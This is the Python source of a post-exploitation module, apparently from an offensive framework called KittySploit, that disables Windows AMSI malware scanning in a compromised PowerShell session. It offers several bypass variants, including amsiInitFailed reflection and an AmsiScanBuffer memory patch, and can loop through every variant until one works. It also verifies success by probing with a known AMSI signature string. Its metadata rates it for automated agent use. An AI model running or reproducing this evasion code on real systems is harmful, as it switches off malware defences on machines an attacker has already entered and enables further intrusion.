#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.c2.stager_evasion import (
    AMSI_INIT_FAILED_VARIANTS,
    AMSI_VARIANTS,
    DEFAULT_AMSI_VARIANT,
    get_amsi_bypass,
)
from lib.post.windows.session import WindowsSessionMixin


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows AMSI Bypass",
        "description": (
            "Disable AMSI in the current PowerShell process. Variants: plain "
            "amsiInitFailed reflection, obfuscated/Base64 field names, AmsiContext "
            "patch, or AmsiScanBuffer memory patch (double-add trampoline)."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1562/001/",
            "https://redteamrecipes.com/blog/2025/11/Evasion/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.5,
            "noise": 0.7,
            "value": 1.1,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {"consumes_capabilities": ["shell"], "produces_capabilities": []},
        },
    }

    variant = OptChoice(
        DEFAULT_AMSI_VARIANT,
        "AMSI bypass technique",
        False,
        choices=list(AMSI_VARIANTS.keys()),
    )
    test_string = OptString(
        "amsiutils",
        "Probe string after bypass (common AMSI signature)",
        False,
    )
    try_all = OptBool(
        False,
        "Try every variant until one succeeds",
        False,
        advanced=True,
    )

    def _verify(self, variant: str) -> bool:
        if variant in AMSI_INIT_FAILED_VARIANTS:
            test = self.win_run_powershell(
                "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
                ".GetField('amsiInitFailed','NonPublic,Static').GetValue($null)",
                timeout=10,
            )
            return "True" in (test or "")

        # Memory / context patches: success if signature probe does not throw
        probe = str(self.test_string or "amsiutils")
        pq = self.win_ps_single_quote(probe)
        out = self.win_run_powershell(
            f"try {{ '{pq}'; 'AMSI_OK' }} catch {{ 'AMSI_BLOCKED:' + $_.Exception.Message }}",
            timeout=10,
        )
        return "AMSI_OK" in (out or "") and "AMSI_BLOCKED" not in (out or "")

    def _apply(self, variant: str) -> bool:
        script = get_amsi_bypass(variant)
        out = self.win_run_powershell(script, timeout=15)
        ok = self._verify(variant)
        if ok:
            print_success(f"AMSI bypass ({variant}) appears active.")
            return True
        print_warning(f"AMSI bypass ({variant}) may have failed.")
        if out:
            print_debug(out[:500])
        return False

    def run(self):
        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False

        if self.try_all:
            print_status("Trying all AMSI bypass variants...")
            for name in AMSI_VARIANTS:
                print_info(f"  → {name}")
                if self._apply(name):
                    return True
            print_error("All AMSI variants failed")
            return False

        name = str(self.variant or DEFAULT_AMSI_VARIANT)
        print_status(f"Applying AMSI bypass: {name}")
        ok = self._apply(name)

        probe = str(self.test_string or "amsiutils")
        pq = self.win_ps_single_quote(probe)
        out = self.win_run_powershell(f"Write-Output '{pq}'", timeout=10)
        if out:
            print_info(f"Probe output: {out}")
        return ok
